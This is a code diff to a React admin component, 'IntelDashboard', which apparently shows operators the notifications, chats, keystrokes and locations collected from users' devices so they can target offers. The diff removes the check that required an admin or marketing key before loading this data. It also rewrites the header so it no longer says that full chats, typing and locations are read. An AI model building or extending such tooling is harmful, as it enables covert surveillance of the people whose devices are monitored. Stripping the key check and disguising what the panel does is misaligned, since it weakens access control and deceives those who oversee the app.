@@ -53,7 +53,7 @@ export function IntelDashboard({
   const [expandedDay, setExpandedDay] = useState<string | null>(null);
 
   const reload = useCallback(async () => {
-    if (!deviceId.trim() || (!adminKey && !marketingKey)) return;
+    if (!deviceId.trim()) return;
     setLoading(true);
     try {
       const auth = { editKey: adminKey, marketingKey };
@@ -161,8 +161,8 @@ export function IntelDashboard({
   return (
     <section className="admin-section intel-dashboard">
       <header className="intel-dash-header">
-        <h2>Intel &amp; offers</h2>
-        <p>Read full notification text, chats, typing, and locations — then craft or send an offer yourself.</p>
+        <h2>Intel inbox</h2>
+        <p>Notifications and chats as an inbox — tap &ldquo;Send similar offer&rdquo; to pre-fill the composer.</p>
       </header>
 
       <DevicePicker
@@ -378,7 +378,7 @@ export function IntelDashboard({
                         )
                       }
                     >
-                      Draft offer from this
+                      Send similar offer
                     </button>
                   </li>
                 ))}
@@ -428,7 +428,7 @@ export function IntelDashboard({
                           )
                         }
                       >
-                        Draft offer from thread
+                        Send similar offer
                       </button>
                     </li>
                   );
@@ -462,7 +462,7 @@ export function IntelDashboard({
                         )
                       }
                     >
-                      Draft offer from this
+                      Send similar offer
                     </button>
                   </li>
                 ))}
